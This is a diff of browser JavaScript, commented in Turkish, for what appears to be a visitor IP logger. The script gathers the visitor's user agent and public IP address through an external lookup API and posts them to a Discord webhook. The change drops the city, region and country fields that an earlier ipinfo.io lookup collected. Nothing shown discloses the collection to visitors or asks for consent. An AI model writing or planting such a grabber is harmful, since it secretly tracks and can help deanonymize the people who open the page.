@@ -22,15 +22,11 @@
     // Kullanıcının cihaz bilgilerini almak
     const userAgent = navigator.userAgent;
 
-    // IP adresi ve konum bilgisini almak için ipinfo.io API'si kullanılıyor
-    fetch('https://ipinfo.io/json?token=YOUR_API_TOKEN') // ipinfo API anahtarınızı buraya ekleyin
+    // IP adresini almak için ipify.org API'si kullanılıyor
+    fetch('https://api.ipify.org?format=json')
         .then(response => response.json())
         .then(data => {
             const ip = data.ip;
-            const city = data.city;
-            const region = data.region;
-            const country = data.country;
-            const location = `${city}, ${region}, ${country}`;
 
             // Discord Webhook'a Embed formatında mesaj gönderme
             const embedMessage = {
@@ -43,11 +39,6 @@
                             {
                                 name: "IP Adresi",
                                 value: ip,
-                                inline: true
-                            },
-                            {
-                                name: "Konum",
-                                value: location,
                                 inline: true
                             },
                             {
